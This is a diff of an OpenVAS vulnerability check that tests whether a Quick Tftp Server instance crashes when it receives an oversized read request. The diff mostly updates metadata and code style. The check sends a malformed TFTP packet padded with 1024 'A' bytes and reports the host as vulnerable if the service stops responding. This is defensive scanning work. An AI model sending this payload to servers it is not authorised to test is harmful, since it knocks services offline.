@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_quick_tftp_server_read_mode_dos_vuln.nasl 12465 2018-11-21 13:24:34Z cfischer $
+# $Id: gb_quick_tftp_server_read_mode_dos_vuln.nasl 13203 2019-01-21 15:28:12Z cfischer $
 #
 # Quick Tftp Server Read Mode Denial of Service Vulnerability
 #
@@ -27,17 +27,19 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.807479");
-  script_version("$Revision: 12465 $");
+  script_version("$Revision: 13203 $");
   script_tag(name:"cvss_base", value:"7.8");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-11-21 14:24:34 +0100 (Wed, 21 Nov 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-21 16:28:12 +0100 (Mon, 21 Jan 2019) $");
   script_tag(name:"creation_date", value:"2016-03-14 10:59:12 +0530 (Mon, 14 Mar 2016)");
   script_name("Quick Tftp Server Read Mode Denial of Service Vulnerability");
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
   script_family("Denial of Service");
-  script_dependencies("tftpd_detect.nasl");
+  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
   script_require_udp_ports("Services/udp/tftp", 69);
+  script_require_keys("tftp/detected", "Host/runs_windows");
+  script_exclude_keys("keys/TARGET_IS_IPV6");
 
   script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39516/");
 
@@ -70,27 +72,28 @@ include("tftp.inc");
 include("network_func.inc");
 
 socport = get_kb_item("Services/udp/tftp");
-if(!socport){
+if(!socport)
   socport = 69;
-}
 
-if(!tftp_alive(port:socport)){
+if(!get_udp_port_state(socport))
   exit(0);
-}
+
+if(!tftp_alive(port:socport))
+  exit(0);
 
 soc = open_sock_udp(socport);
-if(!soc){
+if(!soc)
   exit(0);
-}
 
 attack = raw_string(0x00, 0x01, 0x00) + raw_string(crap(data:raw_string(0x41),
-                    length: 1024)) + raw_string(0x00);
+                    length:1024)) + raw_string(0x00);
 
 send(socket:soc, data:attack);
 close(soc);
 
 if(!tftp_alive(port:socport)){
-  security_message(port:socport);
+  security_message(port:socport, proto:"udp");
   exit(0);
 }
+
 exit(99);
